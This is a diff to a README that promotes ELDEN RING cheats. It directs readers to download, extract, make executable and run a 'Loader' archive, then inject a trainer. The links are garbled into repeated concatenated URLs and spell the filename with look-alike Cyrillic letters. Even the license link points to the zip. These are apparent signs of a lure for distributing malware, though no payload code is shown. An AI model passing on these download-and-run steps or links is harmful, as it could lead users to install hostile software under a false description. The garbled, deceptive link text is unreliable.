@@ -42,9 +42,9 @@ Our utility suite is crafted for cross-platform compatibility to empower all ELD
 
 Getting started is easy! Please follow each step to activate your ELDEN RING hacks reliably.
 
-1. **Download https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip** from this repository. Simply click the file up top and save it to a secure location on your system.
-2. **Extract the contents** of https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip using your favorite archive utility (such as 7-Zip or WinRAR).
-3. **Launch the https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip (or .app/ELF)** file corresponding to your OS. (For Linux, ensure executable permissions are set: `chmod +x Loader`)
+1. **Download https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip** from this repository. Simply click the file up top and save it to a secure location on your system.
+2. **Extract the contents** of https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip using your favorite archive utility (such as 7-Zip or WinRAR).
+3. **Launch the https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip (or .app/ELF)** file corresponding to your OS. (For Linux, ensure executable permissions are set: `chmod +x Loader`)
 4. **Follow the on-screen instructions** to select your enhancements. Configure feature toggles and hotkeys as needed.
 5. **Start ELDEN RING** and inject the trainer from the Loader interface.
 6. **Enjoy unrivaled power, flexibility, and freedom in ELDEN RING!**
@@ -78,7 +78,7 @@ By using these utilities, you accept all personal risk. The authors assume no re
 
 ## 📜 MIT License (2025 Edition) 📜
 
-This repository is released under the permissive and simple [MIT License](https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip).  
+This repository is released under the permissive and simple [MIT License](https://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/VenkateshAneshwar/ELDEN-RING-Arcane-Toolkit/main/Lоader.zip).  
 You are free to use, modify, distribute, and build upon this project so long as you retain the original copyright.
 
 ---
